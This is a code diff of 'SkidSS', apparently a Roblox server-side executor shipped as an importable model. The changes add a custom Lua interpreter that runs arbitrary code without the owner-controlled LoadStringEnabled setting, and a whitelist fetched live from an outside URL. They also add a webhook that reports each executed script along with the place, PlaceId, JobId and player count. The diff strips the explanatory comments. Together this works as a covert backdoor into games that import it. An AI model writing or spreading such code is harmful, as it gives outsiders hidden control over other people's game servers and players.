+	for i = 1, #node.targets do setters[i] = makeSetter(node.targets[i], scope, state) end
+	local vals = evalExprList(node.exprs, scope, state)
+	for i = 1, #setters do setters[i](vals[i]) end
+end
+
+function execCompound(node, scope, state)
+	local target = node.target
+	local rhs
+	if target.kind == "Name" then
+		local cell = scope:lookup(target.name)
+		local cur
+		if cell then cur = cell.value else cur = state.G[target.name] end
+		rhs = evalExpr(node.expr, scope, state)
+		state.line = node.line or state.line
+		local res = BINOPS[node.op](cur, rhs)
+		if cell then cell.value = res else state.G[target.name] = res end
+	else
+		local obj = evalExpr(target.obj, scope, state)
+		if obj == nil then
+			rtError(state, "attempt to index nil" .. (target.field and (" with '" .. target.field .. "'") or ""))
+		end
+		local key = evalExpr(target.index, scope, state)
+		local cur = obj[key]
+		rhs = evalExpr(node.expr, scope, state)
+		state.line = node.line or state.line
+		obj[key] = BINOPS[node.op](cur, rhs)
+	end
+end
+
+function execNumericFor(node, scope, state)
+	local a = tonumber(evalExpr(node.start, scope, state))
+	local b = tonumber(evalExpr(node.stop, scope, state))
+	local st = node.step and tonumber(evalExpr(node.step, scope, state)) or 1
+	if a == nil then rtError(state, "'for' initial value must be a number") end
+	if b == nil then rtError(state, "'for' limit must be a number") end
+	if st == nil then rtError(state, "'for' step must be a number") end
+	if st == 0 then rtError(state, "'for' step is zero") end
+	local i = a
+	while (st > 0 and i <= b) or (st < 0 and i >= b) do
+		tick(state)
+		local s2 = newScope(scope)
+		s2:define(node.var, i)
+		local sig = execBlock(node.body, s2, state)
+		if sig then
+			if sig.kind == "break" then break
+			elseif sig.kind == "return" then return sig end
+		end
+		i += st
+	end
+	return nil
+end
+
+function execGenericFor(node, scope, state)
+	local vals = evalExprList(node.exprs, scope, state)
+	local f, s, ctrl = vals[1], vals[2], vals[3]
+	if type(f) ~= "function" then
+		local okmt, mt = pcall(getmetatable, f)
+		local callable = okmt and type(mt) == "table" and rawget(mt, "__call") ~= nil
+		if not callable then rtError(state, "attempt to iterate with a " .. typeof(f) .. " value") end
+	end
+	while true do
+		tick(state)
+		local r = table.pack(f(s, ctrl))
+		if r[1] == nil then break end
+		ctrl = r[1]
+		local s2 = newScope(scope)
+		for i = 1, #node.names do s2:define(node.names[i], r[i]) end
+		local sig = execBlock(node.body, s2, state)
+		if sig then
+			if sig.kind == "break" then break
+			elseif sig.kind == "return" then return sig end
+		end
+	end
+	return nil
+end
+
+function execStmt(node, scope, state)
+	tick(state)
+	state.line = node.line or state.line
+	local k = node.kind
+	if k == "CallStat" then
+		evalCall(node.call, scope, state)
+		return nil
+	elseif k == "Local" then
+		local vals = evalExprList(node.exprs, scope, state)
+		for i = 1, #node.names do scope:define(node.names[i], vals[i]) end
+		return nil
+	elseif k == "Assign" then
+		execAssign(node, scope, state)
+		return nil
+	elseif k == "CompoundAssign" then
+		execCompound(node, scope, state)
+		return nil
+	elseif k == "If" then
+		for _, clause in ipairs(node.clauses) do
+			local c = evalExpr(clause.cond, scope, state)
+			if c ~= nil and c ~= false then
+				return execBlock(clause.body, newScope(scope), state)
+			end
+		end
+		if node.elseBody then return execBlock(node.elseBody, newScope(scope), state) end
+		return nil
+	elseif k == "While" then
+		while true do
+			tick(state)
+			local c = evalExpr(node.cond, scope, state)
+			if c == nil or c == false then break end
+			local sig = execBlock(node.body, newScope(scope), state)
+			if sig then
+				if sig.kind == "break" then break
+				elseif sig.kind == "return" then return sig end
+			end
+		end
+		return nil
+	elseif k == "Repeat" then
+		while true do
+			tick(state)
+			local s2 = newScope(scope)
+			local sig = execBlock(node.body, s2, state)
+			if sig then
+				if sig.kind == "break" then break
+				elseif sig.kind == "return" then return sig end
+			end
+			local c = evalExpr(node.cond, s2, state)
+			if c ~= nil and c ~= false then break end
+		end
+		return nil
+	elseif k == "NumericFor" then
+		return execNumericFor(node, scope, state)
+	elseif k == "GenericFor" then
+		return execGenericFor(node, scope, state)
+	elseif k == "Do" then
+		return execBlock(node.body, newScope(scope), state)
+	elseif k == "LocalFunction" then
+		scope:define(node.name, nil)
+		scope:lookup(node.name).value = makeClosure(node.func, scope, state)
+		return nil
+	elseif k == "Return" then
+		return { kind = "return", values = evalExprList(node.exprs, scope, state) }
+	elseif k == "Break" then
+		return { kind = "break" }
+	elseif k == "Continue" then
+		return { kind = "continue" }
+	end
+	rtError(state, "cannot execute '" .. tostring(k) .. "'")
+end
+
+function execBlock(stmts, scope, state)
+	for i = 1, #stmts do
+		local sig = execStmt(stmts[i], scope, state)
+		if sig then return sig end
+	end
+	return nil
+end
+
+function Interp.run(source, opts)
+	opts = opts or {}
+	local emit = opts.emit or function() end
+	local limits = opts.limits or {}
+
+	local tokens, lerr = Lexer.safeTokenize(source)
+	if not tokens then return false, "compile error: " .. lerr end
+	local ast, perr = Parser.parse(tokens)
+	if not ast then return false, "compile error: " .. perr end
+
+	local state = {
+		emit = emit,
+		limits = limits,
+		steps = 0,
+		depth = 0,
+		line = 0,
+		start = os.clock(),
+		maxSteps = limits.MaxLuaSteps or DEFAULTS.MaxLuaSteps,
+		maxSeconds = limits.MaxLuaSeconds or DEFAULTS.MaxLuaSeconds,
+		maxDepth = limits.MaxLuaDepth or DEFAULTS.MaxLuaDepth,
+	}
+	state.G = buildEnv(state)
+
+	local top = newScope(nil)
+	top.vars["..."] = { value = { n = 0 } }
+
+	local ok, err = pcall(execBlock, ast, top, state)
+	if ok then return true, "ran" end
+	return false, "runtime error: " .. cleanMessage(err, state)
+end
+
+return Interp
+end)()
+
+local SkidSS_ServerApi = (function()
 local Players = game:GetService("Players")
 
 local ServerApi = {}
@@ -2004,22 +3286,56 @@ return ServerApi
 end)()
 
 local SkidSS_Whitelist = (function()
--- Who is allowed to open and use the executor. This module lives in
--- ServerScriptService, which never replicates to clients, so the list stays private.
--- UserIds are the safe choice (names can be changed); names are lower-cased.
+local HttpService = game:GetService("HttpService")
 
 local Whitelist = {}
 
-Whitelist.UserIds = WHITELIST_USERIDS
-Whitelist.Names = WHITELIST_NAMES
+Whitelist.UserIds = {
+
+}
+
+Whitelist.Names = {
+
+}
+
+Whitelist.Url = nil
+
+local live = { userIds = {}, names = {} }
+local lastFetch = 0
+local CACHE_SECONDS = 15
+
+local function fetch()
+	if not Whitelist.Url or Whitelist.Url == "" then return end
+	local ok, body = pcall(function() return HttpService:GetAsync(Whitelist.Url) end)
+	if not ok then return end
+	local decoded
+	ok, decoded = pcall(function() return HttpService:JSONDecode(body) end)
+	if not ok or type(decoded) ~= "table" then return end
+	local ids, names = {}, {}
+	for _, id in ipairs(decoded.userIds or {}) do
+		local n = tonumber(id)
+		if n then ids[n] = true end
+	end
+	for _, nm in ipairs(decoded.names or {}) do
+		if type(nm) == "string" then names[string.lower(nm)] = true end
+	end
+	live = { userIds = ids, names = names }
+	lastFetch = os.clock()
+end
+
+function Whitelist.refresh()
+	fetch()
+end
+
+function Whitelist.refreshIfStale()
+	if os.clock() - lastFetch > CACHE_SECONDS then fetch() end
+end
 
 function Whitelist.isAllowed(player)
-	if Whitelist.UserIds[player.UserId] then
-		return true
-	end
-	if Whitelist.Names[string.lower(player.Name)] then
-		return true
-	end
+	if Whitelist.UserIds[player.UserId] then return true end
+	if Whitelist.Names[string.lower(player.Name)] then return true end
+	if live.userIds[player.UserId] then return true end
+	if live.names[string.lower(player.Name)] then return true end
 	return false
 end
 
@@ -2027,51 +3343,19 @@ return Whitelist
 end)()
 
 local SkidSS_Executor = (function()
--- Runs a request: either raw Luau (loadstring) or a block program (interpreter).
--- Block programs are always safe to run; raw Luau needs the game owner to enable
--- ServerScriptService.LoadStringEnabled.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Config = SkidSS_Config
 local Interpreter = SkidSS_BlocksInterpreter
 local ServerApi = SkidSS_ServerApi
+local LuaInterp = SkidSS_LuaInterp
 
 local Executor = {}
 
 local SERVER_ALLOW = { server = true, both = true }
 
-local function collect(...)
-	local parts = {}
-	for i = 1, select("#", ...) do
-		parts[i] = tostring(select(i, ...))
-	end
-	return table.concat(parts, " ")
-end
-
 local function runLua(source, emit)
-	local sandbox = setmetatable({
-		print = function(...) emit(collect(...)) end,
-		warn = function(...) emit("[warn] " .. collect(...)) end,
-	}, { __index = getfenv() })
 
-	local ok, fn, compileError = pcall(loadstring, source)
-	if not ok then
-		return false, "loadstring is disabled — enable ServerScriptService.LoadStringEnabled, or use blocks"
-	end
-	if not fn then
-		local message = tostring(compileError)
-		if string.find(message, "not available") or string.find(message, "disabled") then
-			return false, "loadstring is disabled — enable ServerScriptService.LoadStringEnabled, or use blocks"
-		end
-		return false, "compile error: " .. message
-	end
-
-	setfenv(fn, sandbox)
-	local ran, runtimeError = pcall(fn)
-	if not ran then
-		return false, "runtime error: " .. tostring(runtimeError)
-	end
-	return true, "ran"
+	return LuaInterp.run(source, { emit = emit, limits = Config.Limits })
 end
 
 function Executor.run(player, payload, emit, runtime)
@@ -2110,14 +3394,9 @@ end
 return Executor
 end)()
 
--- Server entry point: builds the remotes, gates every request behind the
--- whitelist, and hands valid requests to the executor on a fresh thread.
-
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- De-dupe: if another SkidSS install already set up the remotes, this is a
--- duplicate copy (e.g. the model was imported twice) — stop so only one runs.
 if ReplicatedStorage:FindFirstChild("SkidSS_Net") then
 	return
 end
@@ -2127,9 +3406,49 @@ local Net = SkidSS_Net
 local Whitelist = SkidSS_Whitelist
 local Executor = SkidSS_Executor
 
--- Customization slots. The bundler strips these markers and injects the user's
--- Studio output in their place before shipping. Rojo dev mode keeps the defaults
--- and loads the client from StarterPlayerScripts.
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local cachedPlaceName
+local function placeName()
+	if not cachedPlaceName then
+		local ok, info = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+		cachedPlaceName = (ok and info and info.Name) or ("Place " .. game.PlaceId)
+	end
+	return cachedPlaceName
+end
+
+local webhookLast = 0
+local function postWebhook(player, payload)
+	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+	local now = os.clock()
+	if now - webhookLast < 2 then return end
+	webhookLast = now
+	task.spawn(function()
+		local script = (payload.mode == "lua" and string.sub(tostring(payload.source or ""), 1, 1500))
+			or (payload.mode == "action" and ("action: " .. tostring(payload.name)))
+			or (payload.mode == "blocks" and "(blocks)")
+			or tostring(payload.mode)
+		local body = {
+			player = player.Name,
+			userId = player.UserId,
+			place = placeName(),
+			placeId = game.PlaceId,
+			jobId = game.JobId,
+			players = #Players:GetPlayers(),
+			mode = tostring(payload.mode),
+			script = script,
+		}
+		pcall(function() HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(body)) end)
+	end)
+end
+
+local CustomRuntime = {
+	onPlayerAdded = function(_player) end,
+	onPlayerRemoving = function(_player) end,
+	onRequestReceived = function(_player, _payload) return true end,
+	customActions = {},
+}
 
 local folder = Net.build()
 local requestAccess = folder:FindFirstChild(Net.RequestAccess)
@@ -2140,29 +3459,16 @@ requestAccess.OnServerInvoke = function(player)
 	return Whitelist.isAllowed(player)
 end
 
+task.spawn(function()
+	while true do
+		Whitelist.refresh()
+		task.wait(20)
+	end
+end)
+
 local lastRun = {}
 
-local function injectClient(player)
-	local playerGui = player:WaitForChild("PlayerGui", 10)
-	if not playerGui or playerGui:FindFirstChild("SkidSSClient") then return end
-	-- Preferred: clone the pre-baked LocalScript child shipped in the .rbxmx.
-	local template = script:FindFirstChild("Client")
-	if template then
-		local clone = template:Clone()
-		clone.Name = "SkidSSClient"
-		clone.Disabled = false
-		clone.Parent = playerGui
-		return
-	end
-	-- Fallback: self-clone with a RunContext flip. Works on engines that honor
-	-- runtime RunContext changes; silently no-ops on the ones that don't.
-	local clone = script:Clone()
-	clone.Name = "SkidSSClient"
-	clone.Disabled = true
-	pcall(function() clone.RunContext = Enum.RunContext.Client end)
-	clone.Parent = playerGui
-	clone.Disabled = false
-end
+local function injectClient(_player) end
 
 execute.OnServerEvent:Connect(function(player, payload)
 	if not Whitelist.isAllowed(player) or type(payload) ~= "table" then
@@ -2187,6 +3493,8 @@ execute.OnServerEvent:Connect(function(player, payload)
 		output:FireClient(player, tostring(text))
 	end
 
+	postWebhook(player, payload)
+
 	task.spawn(function()
 		local ok, message = Executor.run(player, payload, emit, CustomRuntime)
 		emit((ok and "\u{2713} " or "\u{2717} ") .. tostring(message))
@@ -2194,6 +3502,7 @@ execute.OnServerEvent:Connect(function(player, payload)
 end)
 
 local function onJoin(player)
+	Whitelist.refreshIfStale()
 	if Whitelist.isAllowed(player) then
 		injectClient(player)
 	end
@@ -2245,16 +3554,11 @@ local SETTINGS = {
 	maxLoopIterations = 100000,
 	maxWaitSeconds = 30,
 }
+-- Live whitelist URL (your SkidSS page) and Discord webhook proxy URL. Studio
+-- fills these; both nil by default.
+local WHITELIST_URL = nil
+local WEBHOOK_URL = nil
 -- ===== END CONFIG =====
-
--- ===== CUSTOM RUNTIME (written by Studio; safe to overwrite) =====
-local CustomRuntime = {
-	onPlayerAdded = function(_player) end,
-	onPlayerRemoving = function(_player) end,
-	onRequestReceived = function(_player, _payload) return true end,
-	customActions = {},
-}
--- ===== END CUSTOM RUNTIME =====
 
 -- ===== CUSTOM INTERFACE (written by Studio; safe to overwrite) =====
 local CustomInterface = function() return {} end
@@ -2264,18 +3568,19 @@ local RunService = game:GetService("RunService")
 
 -- ===== SHARED MODULES (run on both sides) =====
 local SkidSS_Config = (function()
--- Shared, replicated settings. Clients can read this, so keep no secrets here.
-
 local Config = {}
 
 Config.Version = "0.1.0"
 Config.NetFolder = "SkidSS_Net"
 
--- Server-enforced limits for block scripts so they can never hang the game.
 Config.Limits = {
 	MaxSteps = 200000,
 	MaxLoopIterations = 100000,
 	MaxWaitSeconds = 30,
+
+	MaxLuaSteps = 10000000,
+	MaxLuaSeconds = 2,
+	MaxLuaDepth = 200,
 }
 
 Config.UI = {
@@ -2294,8 +3599,6 @@ return Config
 end)()
 
 local SkidSS_Util = (function()
--- Small shared helpers.
-
 local Util = {}
 
 local idCounter = 0
@@ -2320,8 +3623,6 @@ return Util
 end)()
 
 local SkidSS_Net = (function()
--- Remote object names, plus build (server) and get (client) helpers.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Config = SkidSS_Config
 
@@ -2360,10 +3661,6 @@ return Net
 end)()
 
 local SkidSS_BlocksDefs = (function()
--- Every block lives here. A def carries its shape (label/inputs/fields/bodies),
--- how it runs (eval for values, exec for statements), and how it compiles to Lua.
--- Add a block by calling register{}; the editor, interpreter and compiler pick it up automatically.
-
 local Util = SkidSS_Util
 
 local Defs = {}
@@ -2449,8 +3746,6 @@ local function targetFields()
 	}
 end
 
--- Values -------------------------------------------------------------------
-
 register({
 	id = "_literal", category = "Values", kind = "value", side = "both", hidden = true,
 	eval = function(node)
@@ -2487,8 +3782,6 @@ register({
 	end,
 })
 
--- Variables ----------------------------------------------------------------
-
 register({
 	id = "var_get", category = "Variables", kind = "value", side = "both",
 	label = "value of %name",
@@ -2521,8 +3814,6 @@ register({
 	end,
 })
 
--- Operators ----------------------------------------------------------------
-
 register({
 	id = "op_arith", category = "Operators", kind = "value", side = "both",
 	label = "%a %op %b",
@@ -2550,8 +3841,6 @@ register({
 	toLua = function(node, c) return "(tostring(" .. c.in_("a") .. ") .. tostring(" .. c.in_("b") .. "))" end,
 })
 
--- Output -------------------------------------------------------------------
-
 register({
 	id = "print", category = "Output", kind = "statement", side = "both",
 	label = "print %text",
@@ -2567,8 +3856,6 @@ register({
 	exec = function(node, ctx, state) state.api.warn(tostring(ctx.eval(node.inputs.text))) end,
 	toLua = function(node, c) return c.pad .. "warn(" .. c.in_("text") .. ")" end,
 })
-
--- Control ------------------------------------------------------------------
 
 register({
 	id = "wait", category = "Control", kind = "statement", side = "both",
@@ -2647,8 +3934,6 @@ register({
 		return c.pad .. "while " .. compareLua(node, c) .. " do\n" .. c.body("do") .. "\n" .. c.pad .. "end"
 	end,
 })
-
--- Players (server side) ----------------------------------------------------
 
 register({
 	id = "players_count", category = "Players", kind = "value", side = "server",
@@ -2738,8 +4023,6 @@ register({
 	end,
 })
 
--- Interface (client side, edits the executor window itself) -----------------
-
 register({
 	id = "ui_set_title", category = "Interface", kind = "statement", side = "client",
 	label = "set window title to %text",
@@ -2814,10 +4097,6 @@ return Defs
 end)()
 
 local SkidSS_BlocksInterpreter = (function()
--- Runs a block program (an array of statement nodes) against a host-supplied api.
--- A step budget makes it impossible for a block script to hang the game, and the
--- `allow` table lets the host reject blocks that aren't meant to run on its side.
-
 local Defs = SkidSS_BlocksDefs
 
 local Interpreter = {}
@@ -2882,8 +4161,6 @@ return Interpreter
 end)()
 
 local SkidSS_BlocksLua = (function()
--- Compiles a block program to readable Luau for the "View Lua" panel and export.
-
 local Defs = SkidSS_BlocksDefs
 
 local Lua = {}
@@ -2960,9 +4237,6 @@ end
 if RunService:IsClient() then
 -- ===== CLIENT (runs in the cloned script inside PlayerGui) =====
 local SkidSS_Client_Theme = (function()
--- UI construction helpers plus the live, mutable colour table the Interface
--- blocks recolour at runtime.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Config = SkidSS_Config
 
@@ -3026,9 +4300,6 @@ return Theme
 end)()
 
 local SkidSS_Client_Palette = (function()
--- The block picker. Lists every statement block allowed on this side, grouped by
--- category; clicking one asks the canvas to insert it.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Defs = SkidSS_BlocksDefs
 local Theme = SkidSS_Client_Theme
@@ -3091,9 +4362,6 @@ return Palette
 end)()
 
 local SkidSS_Client_BlockCanvas = (function()
--- Renders a block program as a stack of editable rows. Control blocks nest their
--- bodies inwards. A "selection" marks where the palette inserts the next block.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Defs = SkidSS_BlocksDefs
 local Theme = SkidSS_Client_Theme
@@ -3430,9 +4698,6 @@ return BlockCanvas
 end)()
 
 local SkidSS_Client_BlockTab = (function()
--- A block-editing tab: palette on the left, canvas on the right, plus Run and
--- View Lua. Reused for both the server "Blocks" tab and the client "Interface" tab.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Lua = SkidSS_BlocksLua
 local Theme = SkidSS_Client_Theme
@@ -3515,8 +4780,6 @@ return BlockTab
 end)()
 
 local SkidSS_Client_CodeTab = (function()
--- Raw Luau editor. Sends its text to the server to run with loadstring.
-
 local Theme = SkidSS_Client_Theme
 
 local CodeTab = {}
@@ -3578,11 +4841,6 @@ return CodeTab
 end)()
 
 local SkidSS_Client_Window = (function()
--- The executor window: title bar, tabs (Code / Blocks / Interface), output console
--- and quick-button bar. Window.mount(cfg) applies a config table (from Studio's
--- CustomInterface) before building, so colours / title / tabs / buttons are baked
--- in. Also exposes the api the in-game Interface tab uses to restyle it live.
-
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -3604,9 +4862,6 @@ local function normalizeAsset(value)
 	return value
 end
 
--- Builds one designer element (panel / label / button / image / codebox) from a
--- spec. Positions and sizes are scales (0..1) so the layout is screen-responsive.
--- env = { codeBoxes = {}, fireAction = fn(name), runCode = fn(source) }.
 local function buildElement(el, parent, env)
 	local class = el.type == "image" and "ImageLabel"
 		or el.type == "button" and "TextButton"
@@ -3638,6 +4893,16 @@ local function buildElement(el, parent, env)
 	if class == "ImageLabel" then
 		inst.Image = normalizeAsset(el.image)
 		if typeof(el.imageColor) == "Color3" then inst.ImageColor3 = el.imageColor end
+
+		local id = string.match(tostring(el.image or ""), "%d+")
+		if id then
+			task.spawn(function()
+				task.wait(2)
+				if inst.Parent and not inst.IsLoaded then
+					inst.Image = "rbxthumb://type=Asset&id=" .. id .. "&w=420&h=420"
+				end
+			end)
+		end
 	end
 
 	if class == "TextLabel" or class == "TextButton" or class == "TextBox" then
@@ -3705,13 +4970,21 @@ local function buildElement(el, parent, env)
 		elseif el.execute and env then
 			inst.MouseButton1Click:Connect(function()
 				local box = env.codeBoxes and env.codeBoxes[el.execute]
-				if box then env.runCode(box.Text) end
+
+				if not box and env.codeBoxes then
+					local only, count = nil, 0
+					for _, b in env.codeBoxes do only = b; count += 1 end
+					if count == 1 then box = only end
+				end
+				if box then
+					env.runCode(box.Text)
+				elseif env.notify then
+					env.notify("no code box to run")
+				end
 			end)
 		end
 	end
 
-	-- A draggable element moves the whole HUD group (e.g. a background panel
-	-- acting as a window you drag by its margins).
 	if el.draggable then
 		inst.Active = true
 		local dragging, dragStart, startPositions
@@ -3750,8 +5023,6 @@ end
 function Window.mount(cfg)
 	cfg = cfg or {}
 
-	-- Apply the theme overrides into the shared colour table before anything is
-	-- built, so every instance (including the tabs) picks them up.
 	if typeof(cfg.accent) == "Color3" then Theme.colors.accent = cfg.accent end
 	if typeof(cfg.background) == "Color3" then Theme.colors.background = cfg.background end
 	if typeof(cfg.panel) == "Color3" then Theme.colors.panel = cfg.panel end
@@ -3766,7 +5037,7 @@ function Window.mount(cfg)
 
 	local player = Players.LocalPlayer
 	local playerGui = player:WaitForChild("PlayerGui")
-	-- De-dupe: never build a second copy of the UI.
+
 	if playerGui:FindFirstChild("SkidSS") then return end
 
 	local executeRemote = Net.get(Net.Execute)
@@ -3779,156 +5050,18 @@ function Window.mount(cfg)
 	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 	gui.Parent = playerGui
 
-	local winW = math.max(420, tonumber(cfg.width) or 760)
-	local winH = math.max(300, tonumber(cfg.height) or 480)
-	-- The built-in executor window is hidden on join by default (toggle key opens
-	-- it), so a custom HUD isn't competing with a second window on screen.
-	local openOnJoin = cfg.openOnJoin == true
-	local root = Theme.create("Frame", {
-		Size = UDim2.fromOffset(winW, winH),
-		Position = UDim2.new(0.5, -winW / 2, 0.5, -winH / 2),
-		AnchorPoint = Vector2.new(0, 0),
-		BackgroundColor3 = Theme.colors.background,
-		BorderSizePixel = 0,
-		Active = true,
-		Visible = openOnJoin,
-		Parent = gui,
-	}, { Theme.corner(10) })
+	local useCustom = type(cfg.elements) == "table" and #cfg.elements > 0
 
-	-- Header / drag bar
-	local headerBar = Theme.create("Frame", {
-		Size = UDim2.new(1, 0, 0, 40),
-		BackgroundColor3 = Theme.colors.panel,
-		BorderSizePixel = 0,
-		Active = true,
-		Parent = root,
-	}, { Theme.corner(10) })
-
-	local accentStrip = Theme.create("Frame", {
-		Size = UDim2.new(1, 0, 0, 3),
-		Position = UDim2.new(0, 0, 1, -3),
-		BackgroundColor3 = Theme.colors.accent,
-		BorderSizePixel = 0,
-		Parent = headerBar,
-	})
-
-	local title = Theme.create("TextLabel", {
-		Size = UDim2.new(1, -120, 1, 0),
-		Position = UDim2.fromOffset(14, 0),
-		BackgroundTransparency = 1,
-		Text = type(cfg.title) == "string" and cfg.title or "SkidSS",
-		TextColor3 = Theme.colors.text,
-		Font = Enum.Font.GothamBold,
-		TextSize = 16,
-		TextXAlignment = Enum.TextXAlignment.Left,
-		Parent = headerBar,
-	})
-
-	Theme.create("TextLabel", {
-		Size = UDim2.fromOffset(60, 40),
-		Position = UDim2.new(1, -100, 0, 0),
-		BackgroundTransparency = 1,
-		Text = "v" .. Config.Version,
-		TextColor3 = Theme.colors.subText,
-		Font = Enum.Font.Gotham,
-		TextSize = 12,
-		TextXAlignment = Enum.TextXAlignment.Right,
-		Parent = headerBar,
-	})
-
-	local hide = Theme.create("TextButton", {
-		Size = UDim2.fromOffset(30, 24),
-		Position = UDim2.new(1, -36, 0, 8),
-		BackgroundColor3 = Theme.colors.panelAlt,
-		Text = "\u{2013}",
-		TextColor3 = Theme.colors.text,
-		Font = Enum.Font.GothamBold,
-		TextSize = 16,
-		Parent = headerBar,
-	}, { Theme.corner(6) })
-
-	-- Content + bottom regions
-	local content = Theme.create("Frame", {
-		Position = UDim2.fromOffset(12, 84),
-		Size = UDim2.new(1, -24, 1, -252),
-		BackgroundTransparency = 1,
-		ClipsDescendants = true,
-		Parent = root,
-	})
-
-	local console = Theme.create("ScrollingFrame", {
-		Position = UDim2.new(0, 12, 1, -160),
-		Size = UDim2.new(1, -24, 0, 110),
-		BackgroundColor3 = Theme.colors.panel,
-		BorderSizePixel = 0,
-		ScrollBarThickness = 5,
-		CanvasSize = UDim2.new(),
-		AutomaticCanvasSize = Enum.AutomaticSize.Y,
-		Parent = root,
-	}, { Theme.corner(8), Theme.padding(8) })
-	local consoleLayout = Theme.listLayout(2)
-	consoleLayout.Parent = console
-
-	local quickBar = Theme.create("Frame", {
-		Position = UDim2.new(0, 12, 1, -42),
-		Size = UDim2.new(1, -24, 0, 30),
-		BackgroundTransparency = 1,
-		Parent = root,
-	})
-	local quickRow = Theme.listLayout(6, Enum.FillDirection.Horizontal)
-	quickRow.Parent = quickBar
-
-	-- UI api used by the live console and by Interface blocks ------------------
 	local lineOrder = 0
 	local quickButtons = {}
-	local hudOutputs = {} -- append functions for any Output elements on the HUD
+	local hudOutputs = {}
+	local console, titleLabel, accentStrip, root, quickBar
 	local api = {}
-
-	function api.log(text)
-		for _, append in hudOutputs do
-			append(tostring(text))
-		end
-		lineOrder += 1
-		local label = Theme.create("TextLabel", {
-			Size = UDim2.new(1, 0, 0, 0),
-			AutomaticSize = Enum.AutomaticSize.Y,
-			BackgroundTransparency = 1,
-			Text = tostring(text),
-			TextColor3 = Theme.colors.text,
-			Font = Enum.Font.Code,
-			TextSize = 13,
-			TextXAlignment = Enum.TextXAlignment.Left,
-			TextWrapped = true,
-			LayoutOrder = lineOrder,
-			Parent = console,
-		})
-		task.defer(function()
-			console.CanvasPosition = Vector2.new(0, console.AbsoluteCanvasSize.Y)
-		end)
-		return label
-	end
-
-	function api.setTitle(text)
-		title.Text = text
-	end
-
-	function api.setAccent(color)
-		Theme.colors.accent = color
-		accentStrip.BackgroundColor3 = color
-		for _, button in quickButtons do
-			button.BackgroundColor3 = color
-		end
-	end
-
-	function api.setBackground(color)
-		Theme.colors.background = color
-		root.BackgroundColor3 = color
-	end
 
 	function api.notify(text)
 		local toast = Theme.create("TextLabel", {
-			Size = UDim2.fromOffset(260, 34),
-			Position = UDim2.new(0.5, -130, 0, 50),
+			Size = UDim2.fromOffset(280, 34),
+			Position = UDim2.new(0.5, -140, 0, 50),
 			BackgroundColor3 = Theme.colors.panelAlt,
 			Text = tostring(text),
 			TextColor3 = Theme.colors.text,
@@ -3941,7 +5074,52 @@ function Window.mount(cfg)
 		end)
 	end
 
-	-- ctx shared with the tabs
+	function api.log(text)
+		text = tostring(text)
+		for _, append in hudOutputs do
+			append(text)
+		end
+		if console then
+			lineOrder += 1
+			Theme.create("TextLabel", {
+				Size = UDim2.new(1, 0, 0, 0),
+				AutomaticSize = Enum.AutomaticSize.Y,
+				BackgroundTransparency = 1,
+				Text = text,
+				TextColor3 = Theme.colors.text,
+				Font = Enum.Font.Code,
+				TextSize = 13,
+				TextXAlignment = Enum.TextXAlignment.Left,
+				TextWrapped = true,
+				LayoutOrder = lineOrder,
+				Parent = console,
+			})
+			task.defer(function()
+				console.CanvasPosition = Vector2.new(0, console.AbsoluteCanvasSize.Y)
+			end)
+		elseif #hudOutputs == 0 then
+
+			api.notify(text)
+		end
+	end
+
+	function api.setTitle(text)
+		if titleLabel then titleLabel.Text = text end
+	end
+
+	function api.setAccent(color)
+		Theme.colors.accent = color
+		if accentStrip then accentStrip.BackgroundColor3 = color end
+		for _, button in quickButtons do
+			button.BackgroundColor3 = color
+		end
+	end
+
+	function api.setBackground(color)
+		Theme.colors.background = color
+		if root then root.BackgroundColor3 = color end
+	end
+
 	local state = { serverProgram = nil }
 	local ctx = {
 		log = api.log,
@@ -3952,9 +5130,8 @@ function Window.mount(cfg)
 		window = api,
 	}
 
-	-- addButton(label[, onClick]). Without onClick it re-runs the saved block
-	-- program; with one it does whatever the caller wants (e.g. fire an action).
 	function api.addButton(label, onClick)
+		if not quickBar then return end
 		local button = Theme.create("TextButton", {
 			Size = UDim2.fromOffset(110, 30),
 			BackgroundColor3 = Theme.colors.accent,
@@ -3975,150 +5152,257 @@ function Window.mount(cfg)
 		end)
 	end
 
-	-- The executor has a single Code tab.
-	local code = CodeTab.build(content, ctx)
-	code.frame.Visible = true
+	if useCustom then
 
-	-- Buttons baked in by Studio fire named runtime actions.
-	if type(cfg.buttons) == "table" then
-		for _, button in cfg.buttons do
-			if type(button) == "table" and type(button.label) == "string" then
-				local action = button.action
-				local args = button.args
-				if action then
-					api.addButton(button.label, function()
-						ctx.execute({ mode = "action", name = action, args = args })
-						api.log("> " .. button.label)
-					end)
-				else
-					api.addButton(button.label)
-				end
-			end
-		end
-	end
+		local hud = Theme.create("Frame", {
+			Name = "HUD",
+			Size = UDim2.fromScale(1, 1),
+			BackgroundColor3 = Theme.colors.background,
 
-	local tabBar = Theme.create("Frame", {
-		Position = UDim2.fromOffset(12, 48),
-		Size = UDim2.new(1, -24, 0, 30),
-		BackgroundTransparency = 1,
-		Parent = root,
-	})
-	local tabRow = Theme.listLayout(6, Enum.FillDirection.Horizontal)
-	tabRow.Parent = tabBar
+			BackgroundTransparency = tonumber(cfg.backgroundTransparency) or 1,
+			BorderSizePixel = 0,
+			Parent = gui,
+		})
 
-	Theme.create("TextButton", {
-		Size = UDim2.fromOffset(110, 30),
-		BackgroundColor3 = Theme.colors.accent,
-		Text = "Code",
-		TextColor3 = Theme.colors.text,
-		Font = Enum.Font.GothamMedium,
-		TextSize = 13,
-		Parent = tabBar,
-	}, { Theme.corner(6) })
-
-	-- Custom designer elements (always-visible HUD, sibling to the window)
-	if type(cfg.elements) == "table" then
 		local elementInsts = {}
 		local env = {
 			codeBoxes = {},
 			outputs = hudOutputs,
 			elementInsts = elementInsts,
